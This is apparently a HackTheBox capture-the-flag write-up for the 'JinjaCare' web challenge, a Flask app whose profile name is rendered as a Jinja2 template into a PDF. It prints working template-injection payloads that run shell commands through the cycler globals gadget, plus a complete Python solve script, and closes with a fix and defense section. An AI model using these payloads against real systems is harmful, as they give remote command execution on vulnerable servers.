---
title: "JinjaCare"
date: 2026-10-11 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, ssti, jinja2, flask, rce, pdf]
description: "A Very Easy Web challenge: a Flask app renders your profile name into a PDF vaccination certificate with render_template_string. Because the name is template source, not data, it is a textbook Jinja2 SSTI - the catch is the output only appears in the downloaded PDF, so you read the flag with pdftotext."
---

## Overview

`JinjaCare` is a Very Easy HackTheBox **Web** challenge. It is a Flask app that manages
COVID-19 vaccination records and lets a logged-in user download a PDF "vaccination
certificate". That certificate is built server-side by rendering the user's profile fields
into a Jinja2 template, so a profile field becomes template code: a
[Server-Side Template Injection](https://cwe.mitre.org/data/definitions/1336.html) that
escalates straight to remote command execution as root. The only twist is the output
channel - the result is baked into the downloaded PDF, not the HTML response.

## The technique

The profile **`name`** field (set at `POST /profile/personal`) is concatenated into a Jinja2
template that is rendered with `render_template_string` and then converted to a PDF. Flask's
Jinja2 evaluates `{{ ... }}` server-side, so anything placed in `name` is executed as a
template expression. The generated PDF is just the render sink that shows the result.

Probe with a math expression and read the produced certificate:

```
name = {{7*7}}    ->    certificate PDF shows "Name: 49"
```

`49` instead of the literal `{{7*7}}` confirms the server evaluated the expression. Because
there is no HTML reflection, the confirmation is only visible after downloading the PDF and
running it through `pdftotext`.

## Solution

Register an account, log in, then set the `name` field to a Jinja2 RCE payload and download
the certificate. Jinja2 exposes Python globals you can walk to reach `os`; the `cycler`
global is a clean gadget that needs no `self`/`config` reference:

```
{{ cycler.__init__.__globals__.os.popen('id').read() }}        -> uid=0(root) gid=0(root)
{{ cycler.__init__.__globals__.os.popen('ls /').read() }}      -> ... flag.txt ...
{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}  -> HTB{...}
```

The process runs as root and `/flag.txt` sits at the filesystem root, so a single
`cat /flag.txt` in the `name` field, then downloading the certificate, prints the flag.

Create `solve.py`:

```python
import sys, re, subprocess, requests
base = f"http://{sys.argv[1]}"
s = requests.Session()
email, pw = "ssti@t.com", "Passw0rd1"
s.post(f"{base}/register", data={"name":"x","email":email,"password":pw,"confirmPassword":pw})
s.post(f"{base}/login", data={"email":email,"password":pw})
payload = "{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}"
s.post(f"{base}/profile/personal", data={
    "name":payload,"email":email,"dateOfBirth":"2000-01-01","gender":"male",
    "phone":"1","address":"x","emergencyName":"y","emergencyPhone":"1","relationship":"z"})
pdf = s.get(f"{base}/generate_certificate").content
open("/tmp/jc.pdf","wb").write(pdf)
text = subprocess.run(["pdftotext","/tmp/jc.pdf","-"],capture_output=True,text=True).stdout
print(re.search(r"HTB\{[^}]+\}", text).group(0))
```

Run it against the instance and it prints `HTB{...}`.

## Why it worked

The developer trusted profile input as *data* but rendered it as *code*.
`render_template_string` on an attacker-controlled string is the canonical SSTI sink, and
the rendered-PDF output channel does not change anything - the template still executes
server-side before the PDF is produced. The Jinja2 environment exposes Python object globals
(`cycler.__init__.__globals__.os`), so SSTI on a Flask app becomes full RCE, here as root.

## Fix / defense

- Never pass user input as the template *string*. Use a fixed template file and pass the
  name as a **context variable**: `render_template('cert.html', name=name)` - then
  `{{ name }}` is auto-escaped data, never executed.
- If dynamic templates are unavoidable, render inside a sandbox
  (`jinja2.sandbox.SandboxedEnvironment`) and drop process privileges so a successful
  injection does not land as root.
